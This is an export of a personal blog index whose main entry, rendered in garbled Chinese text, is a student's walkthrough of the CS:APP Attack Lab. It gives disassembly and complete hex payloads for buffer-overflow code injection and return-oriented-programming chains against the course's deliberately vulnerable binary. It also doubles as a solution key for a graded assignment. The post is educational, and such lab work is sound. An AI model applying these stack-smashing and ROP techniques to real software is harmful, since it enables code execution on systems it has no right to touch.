
[{"content":" CSAPP:AttackLab # [!WARNING]\né€šè¿‡æœ¬å®éªŒï¼Œä½ å°†å­¦ä¹ åˆ°åˆ©ç”¨å®‰å…¨æ€§æ¼æ´æ”»å‡»æ“ä½œç³»ç»Ÿå’Œç½‘ç»œæœåŠ¡å™¨çš„æ–¹æ³•ã€‚æœ¬å®éªŒçš„ç›®çš„æ˜¯é€šè¿‡æ¨¡æ‹Ÿæ”»å‡»æ¥å¢è¿›å¯¹å®‰å…¨æ¼æ´çš„ç†è§£å’Œé˜²èŒƒæ„è¯†ï¼Œäº†è§£å®‰å…¨æ¼æ´çš„æœ¬è´¨ã€‚æœ¬å®éªŒå†…å®¹åº”ä»…ç”¨äºå­¦ä¹ ç›®çš„ï¼Œä¸¥ç¦ç”¨äºä»»ä½•éæ³•æˆ–ä¸é“å¾·çš„æ´»åŠ¨ã€‚ æœ¬å®éªŒå¼€å§‹å‰ï¼Œéœ€è¦å­¦ä¹ CS:APP3eç¬¬3.10.3èŠ‚å’Œç¬¬3.10.4èŠ‚çš„çŸ¥è¯†ã€‚ https://arthals.ink/blog/attack-lab ä½ è¿˜æ˜¯å¯ä»¥å‚è€ƒè¿™ä½çš„åšå®¢ã€‚ scp -p -r 2236115135-ics@x86.ics.xjtu-ants.net:./attacklab-2236115135-1235135 ~/ //scpä¸‹è½½è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¦‚æœè¦æœ¬åœ°å¼€å‘è¿™æ˜¯å¥½çš„åŠæ³• å‰ä¸‰å±‚æ˜¯CIï¼ˆä»£ç æ³¨å…¥æ”»å‡»ï¼‰æ”»å‡»ï¼Œåä¸¤å±‚æ˜¯ROPï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰æ”»å‡»ã€‚\nä»£ç æ³¨å…¥æ”»å‡»ï¼ˆCode Injection Attacksï¼‰ # phase1: # 0000000000401a90 \u0026lt;test\u0026gt;: 401a90:\t48 83 ec 08 sub $0x8,%rsp ; åˆ†é…äº†å…«ä¸ªå­—èŠ‚çš„ç©ºé—´ 401a94:\tb8 00 00 00 00 mov $0x0,%eax 401a99:\te8 31 fe ff ff call 4018cf \u0026lt;getbuf\u0026gt; ; è°ƒç”¨äº†getbufå‡½æ•° 401a9e:\t89 c2 mov %eax,%edx 401aa0:\tbe e8 31 40 00 mov $0x4031e8,%esi 401aa5:\tbf 01 00 00 00 mov $0x1,%edi 401aaa:\tb8 00 00 00 00 mov $0x0,%eax 401aaf:\te8 3c f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401ab4:\t48 83 c4 08 add $0x8,%rsp 401ab8:\tc3 ret 00000000004018cf \u0026lt;getbuf\u0026gt;: 4018cf:\t48 83 ec 38 sub $0x38,%rsp ; åˆ†é…äº†56ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼ˆåœ¨bufé‡Œï¼‰ 4018d3:\t48 89 e7 mov %rsp,%rdi 4018d6:\te8 7e 02 00 00 call 401b59 \u0026lt;Gets\u0026gt; 4018db:\tb8 01 00 00 00 mov $0x1,%eax 4018e0:\t48 83 c4 38 add $0x38,%rsp 4018e4:\tc3 ret 00000000004018e5 \u0026lt;touch1\u0026gt;: 4018e5:\t48 83 ec 08 sub $0x8,%rsp 4018e9:\tc7 05 2d 2c 20 00 01 movl $0x1,0x202c2d(%rip) # 604520 \u0026lt;vlevel\u0026gt; 4018f0:\t00 00 00 4018f3:\tbf 22 31 40 00 mov $0x403122,%edi 4018f8:\te8 53 f4 ff ff call 400d50 \u0026lt;puts@plt\u0026gt; 4018fd:\tbf 01 00 00 00 mov $0x1,%edi 401902:\te8 92 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401907:\tbf 00 00 00 00 mov $0x0,%edi 40190c:\te8 bf f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; æˆ‘è¦æŠŠreturnçš„åœ°å€è¦†ç›–æˆä¸Šé¢çš„touch1å‡½æ•°çš„é¦–åœ°å€ä»¥æ‰§è¡Œtouch1å‡½æ•°ã€‚\né‚£ä¹ˆç›´æ¥æ„é€ å¦‚ä¸‹çš„è¾“å…¥å­—ç¬¦ä¸²å³å¯ï¼Œè®°å¾—ä½¿ç”¨hex2rawå·¥å…·ã€‚\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e5 18 40 00 phase2: # è¿™é‡Œçš„æ“ä½œå°±æ˜¯ï¼š1.åŒç†è¦†ç›–åœ°å€ã€‚2.ä½ è¦ä¼ ä¸€ä¸ªå‚æ•°æ¥æ‰§è¡Œä½ çš„ä»£ç ã€‚\næˆ‘è¦æŠŠè¦†ç›–çš„åœ°å€å˜æˆtouch2,åŒæ—¶è¦ä¼ å‚æ•°ã€‚\n0000000000401911 \u0026lt;touch2\u0026gt;: 401911:\t48 83 ec 08 sub $0x8,%rsp 401915:\t89 fa mov %edi,%edx 401917:\tc7 05 ff 2b 20 00 02 movl $0x2,0x202bff(%rip) # 604520 \u0026lt;vlevel\u0026gt; 40191e:\t00 00 00 401921:\t39 3d 01 2c 20 00 cmp %edi,0x202c01(%rip) # 604528 \u0026lt;cookie\u0026gt; 401927:\t75 20 jne 401949 \u0026lt;touch2+0x38\u0026gt; 401929:\tbe 48 31 40 00 mov $0x403148,%esi 40192e:\tbf 01 00 00 00 mov $0x1,%edi 401933:\tb8 00 00 00 00 mov $0x0,%eax 401938:\te8 b3 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40193d:\tbf 02 00 00 00 mov $0x2,%edi 401942:\te8 52 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401947:\teb 1e jmp 401967 \u0026lt;touch2+0x56\u0026gt; 401949:\tbe 70 31 40 00 mov $0x403170,%esi 40194e:\tbf 01 00 00 00 mov $0x1,%edi 401953:\tb8 00 00 00 00 mov $0x0,%eax 401958:\te8 93 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40195d:\tbf 02 00 00 00 mov $0x2,%edi 401962:\te8 f4 03 00 00 call 401d5b \u0026lt;fail\u0026gt; 401967:\tbf 00 00 00 00 mov $0x0,%edi 40196c:\te8 5f f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; è¿‡ç¨‹ï¼šè¦†ç›–è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€æ¥æ‰§è¡Œæˆ‘çš„ä»£ç ï¼ˆè¿™ç›¸å½“äºæ˜¯åœ¨stackä¸Šæ‰§è¡Œæˆ‘çš„ä»£ç ï¼Œä½ æƒ³è¿™è¦æ€ä¹ˆåšåˆ°ï¼ŸæŠŠretè¦è¦†ç›–çš„åœ°å€è®¾ç½®æˆåˆ†é…ä¹‹åçš„rspçš„å€¼ï¼Œé‚£ä¹ˆripä¾¿ä¼šä»è¿™é‡Œå¼€å§‹æ‰§è¡Œä»£ç ï¼Œæˆ‘ä»¬å†å°†ä»£ç æ”¾è¿›ç¼“å†²åŒºï¼Œå¥½å¦™çš„æ”»å‡»æŠ€å·§ï¼‰ï¼Œæˆ‘çš„ä»£ç æŠŠ%rdiè®¾ç½®æˆæˆ‘çš„cookieå€¼ï¼Œå¹¶ä¸”é€šè¿‡retæŒ‡ä»¤è¿”å›åˆ°touch2å‡½æ•°æ‰§è¡Œã€‚\nåœ¨getbufåˆ†é…å®Œäº†æ ˆç©ºé—´ä¹‹åï¼Œ%rsp = 0x5563c8d8,è¿™ä¹Ÿå°±æ˜¯ç¼“å†²åŒºçš„èµ·å§‹åœ°å€ã€‚\næˆ‘ä»¬æ„é€ ï¼š\nmovq $0x14e6646f,%rdi ; æŠŠç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®æˆcookieå€¼ pushq $0x00401911 ; è¿™é‡Œpushè¿›å»ä¸€ä¸ªtouch2çš„é¦–åœ°å€å€¼ ret ; retå®é™…ä¸Šå°±æ˜¯æŠŠåˆšåˆšpushè¿›å»çš„å€¼æ‹¿å‡ºæ¥ç„¶åè·³è½¬æ‰§è¡Œ // gcc -c asm.s // objdump -d asm.o \u0026gt; asm.byte æˆ‘ä»¬æ‹¿åˆ°è¿™æ®µæ±‡ç¼–æŒ‡ä»¤çš„å­—èŠ‚ç  phase3: # è¿˜æ˜¯ä¼ å‚ï¼Œä½†æ˜¯ä¼šæ›´éº»çƒ¦ï¼Œè¦è°ƒç”¨æ›´å¤šçš„å‡½æ•°æ¥è§£å†³è¿™ä¸ªé—®é¢˜,æˆ‘è¦æŠŠæˆ‘çš„cookieå€¼ä½œä¸ºä¸€ä¸ªstringä¼ ç»™touch3ã€‚\n0000000000401971 \u0026lt;hexmatch\u0026gt;: 401971:\t41 54 push %r12 401973:\t55 push %rbp 401974:\t53 push %rbx 401975:\t48 83 c4 80 add $0xffffffffffffff80,%rsp 401979:\t89 fd mov %edi,%ebp 40197b:\t48 89 f3 mov %rsi,%rbx 40197e:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401985:\t00 00 401987:\t48 89 44 24 78 mov %rax,0x78(%rsp) 40198c:\t31 c0 xor %eax,%eax 40198e:\te8 bd f4 ff ff call 400e50 \u0026lt;random@plt\u0026gt; 401993:\t48 89 c1 mov %rax,%rcx 401996:\t48 ba 0b d7 a3 70 3d movabs $0xa3d70a3d70a3d70b,%rdx 40199d:\t0a d7 a3 4019a0:\t48 f7 ea imul %rdx 4019a3:\t48 01 ca add %rcx,%rdx 4019a6:\t48 c1 fa 06 sar $0x6,%rdx 4019aa:\t48 89 c8 mov %rcx,%rax 4019ad:\t48 c1 f8 3f sar $0x3f,%rax 4019b1:\t48 29 c2 sub %rax,%rdx 4019b4:\t48 8d 04 92 lea (%rdx,%rdx,4),%rax 4019b8:\t48 8d 14 80 lea (%rax,%rax,4),%rdx 4019bc:\t48 8d 04 95 00 00 00 lea 0x0(,%rdx,4),%rax 4019c3:\t00 4019c4:\t48 29 c1 sub %rax,%rcx 4019c7:\t4c 8d 24 0c lea (%rsp,%rcx,1),%r12 4019cb:\t41 89 e8 mov %ebp,%r8d 4019ce:\tb9 3f 31 40 00 mov $0x40313f,%ecx 4019d3:\t48 c7 c2 ff ff ff ff mov $0xffffffffffffffff,%rdx 4019da:\tbe 01 00 00 00 mov $0x1,%esi 4019df:\t4c 89 e7 mov %r12,%rdi 4019e2:\tb8 00 00 00 00 mov $0x0,%eax 4019e7:\te8 44 f4 ff ff call 400e30 \u0026lt;__sprintf_chk@plt\u0026gt; 4019ec:\tba 09 00 00 00 mov $0x9,%edx 4019f1:\t4c 89 e6 mov %r12,%rsi 4019f4:\t48 89 df mov %rbx,%rdi 4019f7:\te8 34 f3 ff ff call 400d30 \u0026lt;strncmp@plt\u0026gt; 4019fc:\t85 c0 test %eax,%eax 4019fe:\t0f 94 c0 sete %al 401a01:\t48 8b 5c 24 78 mov 0x78(%rsp),%rbx 401a06:\t64 48 33 1c 25 28 00 xor %fs:0x28,%rbx 401a0d:\t00 00 401a0f:\t74 05 je 401a16 \u0026lt;hexmatch+0xa5\u0026gt; 401a11:\te8 5a f3 ff ff call 400d70 \u0026lt;__stack_chk_fail@plt\u0026gt; 401a16:\t0f b6 c0 movzbl %al,%eax 401a19:\t48 83 ec 80 sub $0xffffffffffffff80,%rsp 401a1d:\t5b pop %rbx 401a1e:\t5d pop %rbp 401a1f:\t41 5c pop %r12 401a21:\tc3 ret 0000000000401a22 \u0026lt;touch3\u0026gt;: 401a22:\t53 push %rbx 401a23:\t48 89 fb mov %rdi,%rbx 401a26:\tc7 05 f0 2a 20 00 03 movl $0x3,0x202af0(%rip) # 604520 \u0026lt;vlevel\u0026gt; 401a2d:\t00 00 00 401a30:\t48 89 fe mov %rdi,%rsi 401a33:\t8b 3d ef 2a 20 00 mov 0x202aef(%rip),%edi # 604528 \u0026lt;cookie\u0026gt; 401a39:\te8 33 ff ff ff call 401971 \u0026lt;hexmatch\u0026gt; 401a3e:\t85 c0 test %eax,%eax 401a40:\t74 23 je 401a65 \u0026lt;touch3+0x43\u0026gt; 401a42:\t48 89 da mov %rbx,%rdx 401a45:\tbe 98 31 40 00 mov $0x403198,%esi 401a4a:\tbf 01 00 00 00 mov $0x1,%edi 401a4f:\tb8 00 00 00 00 mov $0x0,%eax 401a54:\te8 97 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a59:\tbf 03 00 00 00 mov $0x3,%edi 401a5e:\te8 36 02 00 00 call 401c99 \u0026lt;validate\u0026gt; 401a63:\teb 21 jmp 401a86 \u0026lt;touch3+0x64\u0026gt; 401a65:\t48 89 da mov %rbx,%rdx 401a68:\tbe c0 31 40 00 mov $0x4031c0,%esi 401a6d:\tbf 01 00 00 00 mov $0x1,%edi 401a72:\tb8 00 00 00 00 mov $0x0,%eax 401a77:\te8 74 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a7c:\tbf 03 00 00 00 mov $0x3,%edi 401a81:\te8 d5 02 00 00 call 401d5b \u0026lt;fail\u0026gt; 401a86:\tbf 00 00 00 00 mov $0x0,%edi 401a8b:\te8 40 f4 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; è¿™æ˜¯ä¸Šé¢ä¸¤ä¸ªå‡½æ•°çš„Cè¯­è¨€æºä»£ç ï¼š\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100;\t//è¿™é‡Œéšæœºåˆ†é…å¯èƒ½å¯¼è‡´çš„ç»“æœæ˜¯æŠŠæˆ‘ä»¬æ³¨å…¥çš„å­—ç¬¦ä¸²è¦†ç›–æ‰ sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } gdbè°ƒè¯•ï¼ˆå…ˆè·Ÿç¬¬äºŒå±‚ä¸€æ ·è·³è½¬åˆ°touch3ï¼‰ï¼š\nå…ˆæŸ¥çœ‹è¿›å…¥hexmatchä¹‹å‰çš„ç¼“å†²åŒºï¼Œæˆ‘ä»¬æ³¨å…¥çš„ä»£ç è¿˜åœ¨ï¼ˆæœªä½¿ç”¨çš„éƒ¨åˆ†ç”¨3få¡«å……ï¼‰\nåœ¨è¿›å…¥äº†ä¹‹åï¼ˆæˆ‘ä»¬å‘ç°æœ‰ä¸€éƒ¨åˆ†å·²ç»è¢«è¦†ç›–ï¼Œä½†æ˜¯æ²¡æœ‰å¨èƒåˆ°æˆ‘ä»¬çš„ä»£ç ï¼Œæ‰€ä»¥è¿™åªæ˜¯æ¦‚ç‡äº‹ä»¶ï¼‰ï¼š\nçœ‹èµ·æ¥28è¿™é‡Œä¸€ç›´éƒ½æ˜¯0,æˆ‘ä»¬å°è¯•æŠŠå­—ç¬¦æ•°ç»„æ”¾åœ¨è¿™é‡Œï¼š\nman ascii //æŸ¥çœ‹å…³äºasciiçš„å¸®åŠ© cookie\u0026mdash;\u0026gt;ascii\n0x14e6646f\u0026mdash;\u0026gt;31 34 65 36 36 34 36 66\næ‹…å¿ƒå‡ºé”™ï¼Œå†æ£€æŸ¥ä¸€éï¼š\nåœ¨æ›´æ”¹çš„æ—¶å€™è¿˜è¦æ³¨æ„ï¼šä¸ä»…ç•™å¿ƒå°ç«¯é¡ºåºï¼Œè¿˜è¦ä¿è¯åŸæ¥è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°çš„å€¼æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚\nQï¼šä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œ28çš„ä½ç½®å†™ä¸è¿›å»ï¼Œåé¢æ”¹æˆ18çš„ä½ç½®å†é‡æ–°å†™è¿›å»ï¼ˆè®°å¾—æ›´æ”¹rdiæŒ‡å‘çš„åœ°å€ï¼Œå‡å¦‚ä½ é”™äº†çš„è¯ï¼‰ã€‚\nè¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆReturn-oriented Programmingï¼‰ # phase4: # åœ¨å‰é¢çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ²¡æœ‰å¯ç”¨æ ˆéšæœºåŒ–å’Œæ ˆæ‰§è¡Œä¿æŠ¤ï¼ˆåœ¨æ ˆä¸Šæ‰§è¡Œä»£ç æœ¬æ¥å°±æ˜¯ä¸€ä»¶å¾ˆå¯ç–‘çš„äº‹æƒ…ï¼‰ï¼Œé‚£ä¹ˆå°±æ¥äº†è¿™ç§æ”»å‡»æ–¹å¼ã€‚\nå®ƒè¦è§£å†³çš„è¿˜æ˜¯ä¸Šé¢çš„phase2å’Œphase3çš„é—®é¢˜ã€‚\nè¿™ç§æ”»å‡»æ–¹å¼çš„æ€è·¯å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸åœ¨æ ˆä¸Šæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œåœ¨å®ƒè‡ªå·±æœ¬èº«å°±æœ‰çš„ä»£ç é‡Œé¢æŒ‘æŒ‘æ‹£æ‹£æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œå¹¶ä¸”æ¯æ¬¡æ‰§è¡Œçš„æŒ‡ä»¤åé¢éƒ½æœ‰c3è¿™æ ·å°±èƒ½ä¸åœçš„ç»§ç»­è°ƒç”¨ä¸‹å»ã€‚\næ±‡ç¼–æŒ‡ä»¤çš„ç›¸å…³å­—èŠ‚ç ï¼š # è¿™æ˜¯å®ƒç»™æˆ‘ä»¬çš„gadgetè¡¨ï¼š # 0000000000401ab9 \u0026lt;start_farm\u0026gt;: 401ab9:\tb8 01 00 00 00 mov $0x1,%eax 401abe:\tc3 ret 0000000000401abf \u0026lt;addval_480\u0026gt;: 401abf:\t8d 87 6e a5 58 c3 lea -0x3ca75a92(%rdi),%eax ;2.3 58 c3 popq %rax (401ac3) ---1.1æŠŠraxè®¾ç½®æˆcookieçš„å€¼ 401ac5:\tc3 ret ; å°±æ˜¯è¿™é‡Œï¼Œæ„šè ¢çš„æˆ‘ä¸€ç›´æŠŠè¿™é‡Œæ•°é”™äº†å¯¼è‡´å‡ ä¸ªå°æ—¶æ²¡çœ‹å‡ºæ¥ä¸ºä»€ä¹ˆæœ‰segmentaion fault 0000000000401ac6 \u0026lt;getval_188\u0026gt;: 401ac6:\tb8 c8 89 c7 90 mov $0x90c789c8,%eax 401acb:\tc3 ret 0000000000401acc \u0026lt;addval_392\u0026gt;: 401acc:\t8d 87 58 91 c3 9e lea -0x613c6ea8(%rdi),%eax 401ad2:\tc3 ret 0000000000401ad3 \u0026lt;addval_406\u0026gt;: 401ad3:\t8d 87 ec ad d8 c3 lea -0x3c275214(%rdi),%eax 401ad9:\tc3 ret 0000000000401ada \u0026lt;getval_227\u0026gt;: 401ada:\tb8 65 48 89 c7 mov $0xc7894865,%eax ; 2.2 2.8 48 89 c7 movq %rax,%rdi(401adc) ---1.2æŠŠrdiè®¾ç½®æˆcookieå€¼ 401adf:\tc3 ret 0000000000401ae0 \u0026lt;getval_437\u0026gt;: 401ae0:\tb8 49 89 c7 90 mov $0x90c78949,%eax 401ae5:\tc3 ret 0000000000401ae6 \u0026lt;setval_348\u0026gt;: 401ae6:\tc7 07 48 89 c7 c3 movl $0xc3c78948,(%rdi) 401aec:\tc3 ret 0000000000401aed \u0026lt;setval_136\u0026gt;: 401aed:\tc7 07 58 90 90 90 movl $0x90909058,(%rdi) 401af3:\tc3 ret 0000000000401af4 \u0026lt;mid_farm\u0026gt;: 401af4:\tb8 01 00 00 00 mov $0x1,%eax 401af9:\tc3 ret 0000000000401afa \u0026lt;add_xy\u0026gt;: 401afa:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax ; 2.7(401afa) è¿™é‡Œå°±æ˜¯ç›´æ¥è®¾è®¡å¥½çš„ 401afe:\tc3 ret 0000000000401aff \u0026lt;getval_314\u0026gt;: 401aff:\tb8 a9 c9 d6 90 mov $0x90d6c9a9,%eax 401b04:\tc3 ret 0000000000401b05 \u0026lt;addval_442\u0026gt;: 401b05:\t8d 87 48 09 e0 90 lea -0x6f1ff6b8(%rdi),%eax 401b0b:\tc3 ret 0000000000401b0c \u0026lt;addval_139\u0026gt;: 401b0c:\t8d 87 89 ca 90 90 lea -0x6f6f3577(%rdi),%eax 401b12:\tc3 ret 0000000000401b13 \u0026lt;addval_491\u0026gt;: 401b13:\t8d 87 1f 4b 89 d6 lea -0x2976b4e1(%rdi),%eax ; 2.6(401b17) mov %edx,%esi 401b19:\tc3 ret 0000000000401b1a \u0026lt;setval_367\u0026gt;: 401b1a:\tc7 07 bb 48 89 e0 movl $0xe08948bb,(%rdi) ; 2.1(401b1d) mov %rsp,%rax 401b20:\tc3 ret 0000000000401b21 \u0026lt;getval_215\u0026gt;: 401b21:\tb8 48 89 e0 c1 mov $0xc1e08948,%eax 401b26:\tc3 ret 0000000000401b27 \u0026lt;setval_192\u0026gt;: 401b27:\tc7 07 89 c1 92 90 movl $0x9092c189,(%rdi) 401b2d:\tc3 ret 0000000000401b2e \u0026lt;getval_418\u0026gt;: 401b2e:\tb8 89 ca 84 c0 mov $0xc084ca89,%eax ;2.5(401b2f) mov %ecx,%edx test %al,%al 401b33:\tc3 ret 0000000000401b34 \u0026lt;addval_318\u0026gt;: 401b34:\t8d 87 8b d6 84 c0 lea -0x3f7b2975(%rdi),%eax 401b3a:\tc3 ret 0000000000401b3b \u0026lt;setval_167\u0026gt;: 401b3b:\tc7 07 48 89 e0 94 movl $0x94e08948,(%rdi) 401b41:\tc3 ret 0000000000401b42 \u0026lt;setval_410\u0026gt;: 401b42:\tc7 07 df 89 ca 91 movl $0x91ca89df,(%rdi) 401b48:\tc3 ret 0000000000401b49 \u0026lt;setval_408\u0026gt;: 401b49:\tc7 07 95 48 81 e0 movl $0xe0814895,(%rdi) 401b4f:\tc3 ret 0000000000401b50 \u0026lt;setval_115\u0026gt;: 401b50:\tc7 07 88 d6 90 c3 movl $0xc390d688,(%rdi) 401b56:\tc3 ret 0000000000401b57 \u0026lt;setval_336\u0026gt;: 401b57:\tc7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401b5d:\tc3 ret 0000000000401b5e \u0026lt;addval_315\u0026gt;: 401b5e:\t8d 87 89 c1 a4 c0 lea -0x3f5b3e77(%rdi),%eax 401b64:\tc3 ret 0000000000401b65 \u0026lt;setval_400\u0026gt;: 401b65:\tc7 07 89 ca 28 d2 movl $0xd228ca89,(%rdi) 401b6b:\tc3 ret 0000000000401b6c \u0026lt;getval_226\u0026gt;: 401b6c:\tb8 88 d6 38 c0 mov $0xc038d688,%eax 401b71:\tc3 ret 0000000000401b72 \u0026lt;getval_388\u0026gt;: 401b72:\tb8 c9 c1 20 c9 mov $0xc920c1c9,%eax ; (401b75) 401b77:\tc3 ret 0000000000401b78 \u0026lt;getval_379\u0026gt;: 401b78:\tb8 68 89 e0 c3 mov $0xc3e08968,%eax 401b7d:\tc3 ret 0000000000401b7e \u0026lt;getval_495\u0026gt;: 401b7e:\tb8 89 d6 92 c3 mov $0xc392d689,%eax 401b83:\tc3 ret 0000000000401b84 \u0026lt;addval_434\u0026gt;: 401b84:\t8d 87 89 ca 28 d2 lea -0x2dd73577(%rdi),%eax 401b8a:\tc3 ret 0000000000401b8b \u0026lt;getval_382\u0026gt;: 401b8b:\tb8 4c 89 e0 c3 mov $0xc3e0894c,%eax 401b90:\tc3 ret 0000000000401b91 \u0026lt;addval_100\u0026gt;: 401b91:\t8d 87 c9 c1 84 c9 lea -0x367b3e37(%rdi),%eax 401b97:\tc3 ret 0000000000401b98 \u0026lt;setval_140\u0026gt;: 401b98:\tc7 07 f8 8b c1 c3 movl $0xc3c18bf8,(%rdi) 401b9e:\tc3 ret 0000000000401b9f \u0026lt;setval_104\u0026gt;: 401b9f:\tc7 07 88 c1 84 c0 movl $0xc084c188,(%rdi) 401ba5:\tc3 ret 0000000000401ba6 \u0026lt;addval_125\u0026gt;: 401ba6:\t8d 87 89 d6 90 c3 lea -0x3c6f2977(%rdi),%eax 401bac:\tc3 ret 0000000000401bad \u0026lt;getval_111\u0026gt;: 401bad:\tb8 16 a9 09 ca mov $0xca09a916,%eax 401bb2:\tc3 ret 0000000000401bb3 \u0026lt;getval_256\u0026gt;: 401bb3:\tb8 a9 ca 20 db mov $0xdb20caa9,%eax 401bb8:\tc3 ret 0000000000401bb9 \u0026lt;getval_170\u0026gt;: 401bb9:\tb8 89 c1 08 d2 mov $0xd208c189,%eax 401bbe:\tc3 ret 0000000000401bbf \u0026lt;setval_102\u0026gt;: 401bbf:\tc7 07 0e 89 c1 c3 movl $0xc3c1890e,(%rdi) ; 2.4(401bc2) mov %eax,%ecx 401bc5:\tc3 ret 0000000000401bc6 \u0026lt;getval_364\u0026gt;: 401bc6:\tb8 81 d6 90 90 mov $0x9090d681,%eax 401bcb:\tc3 ret 0000000000401bcc \u0026lt;setval_159\u0026gt;: 401bcc:\tc7 07 89 ca c1 ce movl $0xcec1ca89,(%rdi) 401bd2:\tc3 ret 0000000000401bd3 \u0026lt;end_farm\u0026gt;: 401bd3:\tb8 01 00 00 00 mov $0x1,%eax 401bd8:\tc3 ret é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚ç å¦‚ä¸‹ï¼š\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c3 1a 40 00 00 00 00 00 6f 64 e6 14 00 00 00 00 dc 1a 40 00 00 00 00 00 11 19 40 00 00 00 00 00 ä¸€å®šè¦æŠŠåœ°å€æ•°æ¸…æ¥šå­©å­ä»¬ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªåœ°å€æˆ‘æ²¡æœ‰æ•°æ¸…æ¥šè€Œæµªè´¹äº†å¾ˆé•¿æ—¶é—´ï¼Œä¸è¿‡è§£å†³æ®µé”™è¯¯ä¹Ÿæ˜¯ä¸€ç§å­¦ä¹ ã€‚ï¼ˆå¾ˆéš¾èšŒçš„ä½å•Šï¼‰\nphase5: # æ®è¯´è¿™æ˜¯æœ€éš¾çš„ä¸€å±‚ï¼Œä¸è¿‡æ—¢ç„¶å·²ç»æ¥è§¦äº†æ±‡ç¼–è¯­è¨€ï¼Œé‚£è¿˜æ˜¯æ¥è¯•è¯•çœ‹ï¼\nè§£é¢˜æ€è·¯æ¥è‡ªäºä¸Šé¢çš„Blogï¼Œåœ¨æ ˆéšæœºåŒ–çš„æƒ…å†µä¸‹ï¼ŒæŠŠrspæŒ‡é’ˆä½œä¸ºä¸€ä¸ªå‚è€ƒç‚¹æ¥æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å‚æ•°ã€‚\nè®¾è®¡çš„asmï¼š\nphase5.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0:\t48 89 e0 mov %rsp,%rax 3:\tc3 ret 4:\t48 89 c7 mov %rax,%rdi 7:\tc3 ret 8:\t58 pop %rax 9:\t90 nop a:\tc3 ret b:\t89 c1 mov %eax,%ecx d:\t90 nop e:\tc3 ret f:\t89 ca mov %ecx,%edx 11:\t84 c0 test %al,%al 13:\tc3 ret 14:\t89 d6 mov %edx,%esi 16:\t20 d2 and %dl,%dl 18:\tc3 ret 19:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax 1d:\t48 89 c7 mov %rax,%rdi 20:\tc3 ret 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1d 1b 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 c3 1a 40 00 00 00 00 00 48 00 00 00 00 00 00 00 c2 1b 40 00 00 00 00 00 2f 1b 40 00 00 00 00 00 17 1b 40 00 00 00 00 00 fa 1a 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 22 1a 40 00 00 00 00 00 31 34 65 36 36 34 36 66 00 00 00 00 00 00 00 00 å¤§åŠŸå‘Šæˆï¼ï¼ï¼æŠ„åˆ«äººå†™çš„å°±æ˜¯ç®€å•å•Šï¼ˆï¼‰ï¼Œå¦‚æœè¯´æœ‰éš¾åº¦ï¼Œé‚£å…¶å®åœ¨äºä½ è¦å†™ä¸€ä¸²æ²¡æœ‰bugçš„æ±‡ç¼–ç„¶åå»æ‰¾ï¼Œä½†æ˜¯çœ‹åˆ«äººçš„å°±ä¸éš¾äº†ï¼ˆï¼Ÿï¼‰ã€‚\n","date":"20 March 2025","externalUrl":null,"permalink":"/tech/csappattacklab/","section":"Tech","summary":"","title":"CSAPP:AttackLab","type":"tech"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/","section":"Mio's Tea Time","summary":"","title":"Mio's Tea Time","type":"page"},{"content":" MySQLè¯­å¥ç®€å•æ•™ç¨‹ # MySQL # æœ¬æ–‡ä»…ä»…æ˜¯ç¬”è€…å¯¹äºSQLè¯­å¥çš„ç®€å•ç†Ÿæ‚‰å’Œå¤ä¹ 